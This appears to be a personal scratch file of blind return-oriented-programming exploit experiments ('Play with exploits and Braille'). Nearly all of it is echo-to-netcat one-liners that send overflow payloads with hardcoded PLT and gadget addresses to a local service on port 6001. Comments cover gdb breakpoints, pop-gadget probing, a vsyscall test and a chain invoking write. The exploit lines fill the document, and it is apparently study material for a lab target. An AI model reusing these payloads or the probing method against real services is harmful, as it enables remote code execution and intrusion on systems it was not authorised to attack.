Play with exploits and Braille

Note that opcode 5c is 'pop %rsp'

For the naslr version, this is an exploit:
echo -e "012345670123456701234567\x42\x12\x40\x00" | nc 127.0.0.1 6001

#Jump to the PLT, then PLT+6, then 0x400237.
# gdb ...
# break *0x400237
# set follow-fork-mode child
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\xe0\x08\x40\x00\x00\x00\x00\x00\xe6\x08\x40\x00\x00\x00\x00\x00\x37\x02\x40\x00\x00\x00\x00\x00" | nc 127.0.0.1 6001


#Two pops
# where? Stack: 0237
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x6a\x0e\x40\x00\x00\x00\x00\x00\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xbb\xbb\xbb\xbb\x37\x02\x40\x00\x00\x00\x00\x00" | nc 127.0.0.1 6001
#One pop
# where? Stack: bbbb, 0237
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x6c\x0e\x40\x00\x00\x00\x00\x00\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xbb\xbb\xbb\xbb\x37\x02\x40\x00\x00\x00\x00\x00" | nc 127.0.0.1 6001
#No pops
# where? Stack: aaaa, bbbb, 0237
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x6e\x0e\x40\x00\x00\x00\x00\x00\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xbb\xbb\xbb\xbb\x37\x02\x40\x00\x00\x00\x00\x00" | nc 127.0.0.1 6001

# These will all end up at 0237
# Because the instructions at PLT are essentially nop;ret, 
# these all fall through to the gadget at the last address.
# In this case, that is the trap gadget.
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x6a\x0e\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\x37\x02\x40\x00\x00\x00\x00\x00" | nc 127.0.0.1 6001
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x6c\x0e\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\x37\x02\x40\x00\x00\x00\x00\x00" | nc 127.0.0.1 6001
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x6e\x0e\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\x37\x02\x40\x00\x00\x00\x00\x00" | nc 127.0.0.1 6001

echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x6e\x0e\x40\x00\x00\x00\x00\x00\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xbb\xbb\xbb\xbb\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xee\xee\xee\xee\xee\xee\xee\xee\xff\xff\xff\xff\xff\xff\xff\xff\x37\x02\x40\x00\x00\x00\x00\x00" | nc 127.0.0.1 6001

#pop rdi, should be a disaster.
# Top item on the stack will be the plt.
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x6d\x0e\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\x37\x02\x40\x00\x00\x00\x00\x00" | nc 127.0.0.1 6001

#six plts, and one inf
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x6d\x0e\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xc0\x08\x40\x00\x00\x00\x00\x00" | nc 127.0.0.1 6001

#six plts, and one inf (debug)
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x6e\x0e\x40\x00\x00\x00\x00\x00\x70\x09\x40\x00\x00\x00\x00\x00\x70\x09\x40\x00\x00\x00\x00\x00\x70\x09\x40\x00\x00\x00\x00\x00\x70\x09\x40\x00\x00\x00\x00\x00\x70\x09\x40\x00\x00\x00\x00\x00\x70\x09\x40\x00\x00\x00\x00\x00\xa0\x09\x40\x00\x00\x00\x00\x00" | nc 127.0.0.1 6001

# test vsyscall time
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x00\x04\x60\xff\xff\xff\xff\xff\x37\x02\x40\x00\x00\x00\x00\x00\x37\x02\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42" | nc 127.0.0.1 6001


echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\xf6\x0e\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xe0\x08\x40\x00\x00\x00\x00\x00\xc0\x08\x40\x00\x00\x00\x00\x00\xc0\x08\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42" | nc 127.0.0.1 6001

# invoke write
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\xb5\x0e\x40\x00\x00\x00\x00\x00\x60\x0d\x40\x00\x00\x00\x00\x00\xb3\x0e\x40\x00\x00\x00\x00\x00\x60\x0d\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2b\x09\x40\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\xb5\x0e\x40\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\xb3\x0e\x40\x00\x00\x00\x00\x00\x60\x0d\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2b\x09\x40\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00" | nc 127.0.0.1 6001

# just enough to start the crash.
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA" | nc 127.0.0.1 6001

# normal!
echo -e "AAAA" | nc 127.0.0.1 6001
